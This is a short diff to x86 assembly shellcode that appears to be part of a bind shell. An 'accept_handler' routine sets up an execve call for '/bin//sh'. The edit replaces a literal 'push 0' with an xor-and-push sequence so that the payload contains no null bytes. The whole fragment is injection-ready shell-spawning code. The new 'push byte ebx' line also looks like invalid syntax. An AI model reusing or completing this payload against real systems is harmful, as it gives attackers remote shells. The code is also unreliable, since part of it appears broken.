@@ -182,7 +182,8 @@ accept_handler:
     mov al, 11
 
     ;/bin//sh -> 0x2f62696e2f2f7368
-    push 0 ; '\0' null terminator
+    xor ebx, ebx
+    push byte ebx ; '\0' null terminator
     push 0x68732f2f ; //sh <-little endian
     push 0x6e69622f ; /bin <-little endian
     mov ebx, esp ; pointer to "/bin/sh"\0
